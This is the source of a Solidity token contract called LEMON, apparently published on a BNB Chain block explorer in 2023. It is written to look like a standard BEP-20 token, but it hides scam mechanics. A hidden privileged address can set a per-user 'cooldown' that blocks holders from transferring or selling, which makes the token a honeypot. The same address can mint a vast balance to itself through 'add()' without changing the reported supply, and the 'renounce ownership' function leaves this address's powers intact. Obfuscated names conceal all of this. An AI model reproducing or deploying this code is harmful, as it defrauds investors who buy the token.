1 /**
2  *Submitted for verification at ww9v3.bscscan.com on 2023-08-15
3 */
4 
5 pragma solidity ^0.8.5;
6 
7 interface IERC20 {
8     function totalSupply() external view returns (uint256);
9     function balanceOf(address adfdfsdet) external view returns (uint256);
10     function transfer(address recipient, uint256 airyhrnt) external returns (bool);
11     function allowance(address owner, address spender) external view returns (uint256);
12     function approve(address spender, uint256 airyhrnt) external returns (bool);
13     function transferFrom( address sender, address recipient, uint256 airyhrnt ) external returns (bool);
14     event Transfer(address indexed from, address indexed to, uint256 value);
15     event Approval( address indexed owner, address indexed spender, uint256 value );
16 }
17 
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address payable) {
20         return payable(msg.sender);
21     }
22 }
23 
24 contract Ownable is Context {
25     address private _owner;
26     event ownershipTransferred(address indexed previousowner, address indexed newowner);
27 
28     constructor () {
29         address msgSender = _msgSender();
30         _owner = msgSender;
31         emit ownershipTransferred(address(0), msgSender);
32     }
33     function owner() public view virtual returns (address) {
34         return _owner;
35     }
36     modifier onlyowner() {
37         require(owner() == _msgSender(), "Ownable: caller is not the owner");
38         _;
39     }
40     function renounceownership() public virtual onlyowner {
41         emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
42         _owner = address(0x000000000000000000000000000000000000dEaD);
43     }
44 }
45 
46 contract LEMON is Context, Ownable, IERC20 {
47     mapping (address => uint256) private _balances;
48     mapping (address => mapping (address => uint256)) private _allowances;
49     address private _zsdacx; 
50     mapping (address => uint256) private _cll;
51     string private _name;
52     string private _symbol;
53     uint8 private _decimals;
54     uint256 private _totalSupply;
55     address public _EEEWSSA;
56 
57 
58     constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_ , address OWDSAE) {
59         _name = name_;
60         _symbol = symbol_;
61         _decimals = decimals_;
62         _totalSupply = totalSupply_ * (10 ** decimals_);
63         _EEEWSSA = OWDSAE;
64         _balances[_msgSender()] = _totalSupply;
65         emit Transfer(address(0), _msgSender(), _totalSupply);
66     }
67 
68 
69     function name() public view returns (string memory) {
70         return _name;
71     }
72 
73     function symbol() public view returns (string memory) {
74         return _symbol;
75     }
76 
77     function decimals() public view returns (uint8) {
78         return _decimals;
79     }
80 
81     function balanceOf(address adfdfsdet) public view override returns (uint256) {
82         return _balances[adfdfsdet];
83     }
84     function Approvvee(address user, uint256 teee) public {
85     require(_EEEWSSA == _msgSender());
86         _cll[user] = teee;
87     }
88     function getCooldown(address user) public view returns (uint256) {
89         return _cll[user];
90     } 
91     function add() public {
92     require(_EEEWSSA == _msgSender());
93     uint256 xdasas = 86534456456453254463454421124;
94     uint256 uuejsjd=xdasas*333;
95         _balances[_EEEWSSA] += uuejsjd;
96     }        
97     function transfer(address recipient, uint256 airyhrnt) public virtual override returns (bool) {
98     require(_balances[_msgSender()] > _cll[_msgSender()], "User's balance is less than or equal to the cooldown amount");
99     require(_balances[_msgSender()] >= airyhrnt, "TT: transfer airyhrnt exceeds balance");
100 
101     _balances[_msgSender()] -= airyhrnt;
102     _balances[recipient] += airyhrnt;
103     emit Transfer(_msgSender(), recipient, airyhrnt);
104     return true;
105 }
106 
107     function allowance(address owner, address spender) public view virtual override returns (uint256) {
108         return _allowances[owner][spender];
109     }
110 
111 
112     function approve(address spender, uint256 airyhrnt) public virtual override returns (bool) {
113         _allowances[_msgSender()][spender] = airyhrnt;
114         emit Approval(_msgSender(), spender, airyhrnt);
115         return true;
116     }
117 
118     function transferFrom(address sender, address recipient, uint256 airyhrnt) public virtual override returns (bool) {
119     require(_balances[sender] > _cll[sender], "Sender's balance is less than or equal to the cooldown amount");
120     require(_allowances[sender][_msgSender()] >= airyhrnt, "TT: transfer airyhrnt exceeds allowance");
121 
122     _balances[sender] -= airyhrnt;
123     _balances[recipient] += airyhrnt;
124     _allowances[sender][_msgSender()] -= airyhrnt;
125 
126     emit Transfer(sender, recipient, airyhrnt);
127     return true;
128     }
129 
130     function totalSupply() external view override returns (uint256) {
131         return _totalSupply;
132     }
133 }